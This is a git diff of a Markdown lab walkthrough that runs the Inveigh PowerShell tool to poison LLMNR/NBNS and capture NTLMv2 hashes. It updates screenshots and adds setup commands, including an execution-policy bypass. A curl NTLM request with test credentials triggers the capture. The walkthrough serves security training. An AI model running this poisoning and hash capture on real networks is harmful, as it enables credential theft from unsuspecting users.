@@ -57,7 +57,7 @@ ipconfig
 
 Then save your ip like this:
 
-<img width="610" height="245" alt="image" src="https://github.com/user-attachments/assets/907b5265-9274-48f8-83c4-ae20ce3579b9" />
+<img width="463" height="179" alt="img01" src="https://github.com/user-attachments/assets/c6db69f2-edef-44fa-acb7-aced2eff1dcb" />
 
 >[!IMPORTANT]
 >
@@ -68,12 +68,20 @@ Then save your ip like this:
 ### Part 2 - Start Inveigh
 
 ```powershell
+cd C:\Users\Administrator\Desktop\Labs\Inveigh\
+Set-ExecutionPolicy -Scope Process Bypass
+Unblock-File .\Inveigh.ps1
+. .\Inveigh.ps1
+Get-Command Invoke-Inveigh
+```
+
+<img width="617" height="143" alt="img02" src="https://github.com/user-attachments/assets/69bfd205-6776-40ae-8a13-6302f3426e20" />
+
+```powershell
 Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y -IP <IP Here>
 ```
 
-<img width="1047" height="522" alt="Screenshot 2026-05-19 203201" src="https://github.com/user-attachments/assets/192ce2b6-673e-4c66-adea-fd71291925d1" />
-
-
+<img width="860" height="388" alt="img03" src="https://github.com/user-attachments/assets/b1f604f9-8664-425e-98cb-ad5058bb032a" />
 
 What each flag does:
 
@@ -99,9 +107,7 @@ Open a **Ubuntu Shell** and run:
 curl -v --ntlm -u testuser:password123 http://<IP here>/
 ```
 
-<img width="1089" height="557" alt="Screenshot 2026-05-19 205712" src="https://github.com/user-attachments/assets/14aeea98-ad70-4c0e-8958-f47536ef8bff" />
-
-
+<img width="818" height="416" alt="img04" src="https://github.com/user-attachments/assets/a9ba7cff-de69-4fd4-ac4d-03ed4b2ee338" />
 
 What happens behind the scenes:
 1. curl connects to Inveigh's fake HTTP server
@@ -117,8 +123,7 @@ The curl command will fail with an auth error - that is expected. The hash is ca
 
 Switch back to the **first PowerShell window** where Inveigh is running. You should see output like:
 
-<img width="1087" height="237" alt="image" src="https://github.com/user-attachments/assets/f3e07534-1102-4388-b53b-1ef61b0af726" />
-
+<img width="950" height="160" alt="img05" src="https://github.com/user-attachments/assets/c2c7debe-e3c2-40e8-b09f-85f14dac6203" />
 
 That long string is the **NTLMv2 hash**. It contains:
 - The username
